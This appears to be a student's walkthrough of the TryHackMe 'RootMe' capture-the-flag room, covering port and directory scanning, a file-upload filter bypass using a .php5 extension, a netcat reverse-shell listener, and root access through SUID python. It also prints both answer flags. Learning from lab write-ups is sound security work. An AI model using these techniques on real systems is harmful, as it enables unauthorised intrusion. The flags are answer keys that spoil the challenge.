# RootMe Notes

Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/

1. Scan ports with nmap: "sudo nmap -sS -A <target ip address>"
- 2 ports open: 80 and 22, apache 2.4.29 and ssh respectively

2. Find hidden directories (GoBuster recommended, but I used dirb) (make sure to use http, as the webpage uses http): "dirb http://<target ip address>"
> -----------------
>DIRB v2.22    
>By The Dark Raver
>-----------------
>
>START_TIME: Sat Nov 20 04:24:35 2021
>URL_BASE: http://10.10.154.79/
>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
>
>-----------------
>
>GENERATED WORDS: 4612                                                          
>
>---- Scanning URL: http://10.10.154.79/ ----
>==> DIRECTORY: http://10.10.154.79/css/                                                                                                                                                 
>+ http://10.10.154.79/index.php (CODE:200|SIZE:616)                                                                                                                                     
>==> DIRECTORY: http://10.10.154.79/js/                                                                                                                                                  
>==> DIRECTORY: http://10.10.154.79/panel/                                                                                                                                               
>+ http://10.10.154.79/server-status (CODE:403|SIZE:277)                                                                                                                                 
>==> DIRECTORY: http://10.10.154.79/uploads/                                                                                                                                             
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/css/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/js/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/panel/ ----
>+ http://10.10.154.79/panel/index.php (CODE:200|SIZE:732)                                                                                                                               
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/uploads/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                               
>-----------------
>END_TIME: Sat Nov 20 04:24:47 2021
>DOWNLOADED: 9224 - FOUND: 3
- Hidden directory is '/panel/'

3. We can upload a payload and get a reverse shell. Download the file that's included with this writeup, extract the file, and change the port and ip to your machine's ip address and a port that's not being used.

4. If we save this as a .php file and try to upload it, we find that we're allowed to upload .php files. There are several ways of bypassing this, but the easiest way is to just change the file extension so that it'll get accepted into the server and so that it'll run when we try to run it. For example, payload.jpg won't work because the .jpg won't run. So we bypass it by simple changing the extension to .php5, which is another version of php that is not blocked by the server. After uploading, go to "<target ip address>/uploads" - which we found earlier with dirb - and make sure that the file has been uploaded

5. Now we set up nc to listen to the port we programmed the script to connect to: "nc -nlvp <port>"

6. Finally, we run the script on the web server with curl: "curl <target ip address>/uploads/<script name>", and we should now have access to the server through netcat

7. We're given the name of the file that contains the flag "user.txt", so we simple use the find command: "find / -type f -name user.txt" and we see that the file is at /var/www/user.txt and when we cat it we find that the flag is THM{y0u_g0t_a_sh3ll}

8. Now we need to escalate our privileges to root. We're asked to search for files with the suid permission set - which lets any user execute the file with the permissions of the owner of the file - and find any files that are supicious. To do this we use find again: "find / -perm /4000 2> /dev/null" (we use "2> /dev/null" to get rid of any errors, such as permission errors for files we're not able to access)
>/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
>/usr/lib/snapd/snap-confine \
>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic \
>/usr/lib/eject/dmcrypt-get-device \
>/usr/lib/openssh/ssh-keysign \
>/usr/lib/policykit-1/polkit-agent-helper-1 \
>/usr/bin/traceroute6.iputils \
>/usr/bin/newuidmap \
>/usr/bin/newgidmap \
>/usr/bin/chsh \
>/usr/bin/python \
>/usr/bin/at \
>/usr/bin/chfn \
>/usr/bin/gpasswd \
>/usr/bin/sudo \
>/usr/bin/newgrp \
>/usr/bin/passwd \
>/usr/bin/pkexec \
>/snap/core/8268/bin/mount \
>/snap/core/8268/bin/ping \
>/snap/core/8268/bin/ping6 \
>/snap/core/8268/bin/su \
>/snap/core/8268/bin/umount \
>/snap/core/8268/usr/bin/chfn \
>/snap/core/8268/usr/bin/chsh \
>/snap/core/8268/usr/bin/gpasswd \
>/snap/core/8268/usr/bin/newgrp \
>/snap/core/8268/usr/bin/passwd \
>/snap/core/8268/usr/bin/sudo \
>/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
>/snap/core/8268/usr/lib/openssh/ssh-keysign \
>/snap/core/8268/usr/lib/snapd/snap-confine \
>/snap/core/8268/usr/sbin/pppd \
>/snap/core/9665/bin/mount \
>/snap/core/9665/bin/ping \
>/snap/core/9665/bin/ping6 \
>/snap/core/9665/bin/su \
>/snap/core/9665/bin/umount \
>/snap/core/9665/usr/bin/chfn \
>/snap/core/9665/usr/bin/chsh \
>/snap/core/9665/usr/bin/gpasswd \
>/snap/core/9665/usr/bin/newgrp \
>/snap/core/9665/usr/bin/passwd \
>/snap/core/9665/usr/bin/sudo \
>/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
>/snap/core/9665/usr/lib/openssh/ssh-keysign \
>/snap/core/9665/usr/lib/snapd/snap-confine \
>/snap/core/9665/usr/sbin/pppd \
>/bin/mount \
>/bin/su \
>/bin/fusermount \
>/bin/ping \
>/bin/umount

9. Looking through the results, we see nothing suspicious until we see python. Python's an interpreter for the python programming language, and setting SUID on it makes no sense because there's no reason to run it as root; it'll produce the same output no matter who runs it. We check if that's the binary that the challenge is looking for, and it is. "/usr/bin/python"

10. Now we need to write some python code and run it with /usr/bin/python to let us view the contents of the /root directory (it's given that the last flag is called root.txt, so we'll assume that it's located in /root)

11. I tried writing the code inside the shell we got from the reverse shell, but python and vim were acting weird, so I instead wrote the code inside the attacker machine, uploaded it to the server just like we did with the reverse php file, and used "find / -type d -name ```*uploads*``` 2> /dev/null" to find where the files we uploaded were located. I needed to find the location because I couldn't just execute the python file with curl like we did with the php payload. I found that the files were in /var/www/html/uploads

12. After this, I wrote a basic python script to print out the contents or /root
>#!/usr/bin/python \
>import os
>
>print(os.listdir('/root'))

13. I then uploaded that to the server and used "/usr/bin/python /var/www/html/uploads/<filename>", and I see that root.txt is indeed in /root

14. Finally, to print out the contents of root.txt, I wrote this script
>#!/usr/bin/python \
>import os
>
>file = open('/root/root.txt', 'r') \
>print(file.read())

The last flag is THM{pr1v1l3g3_3sc4l4t10n}
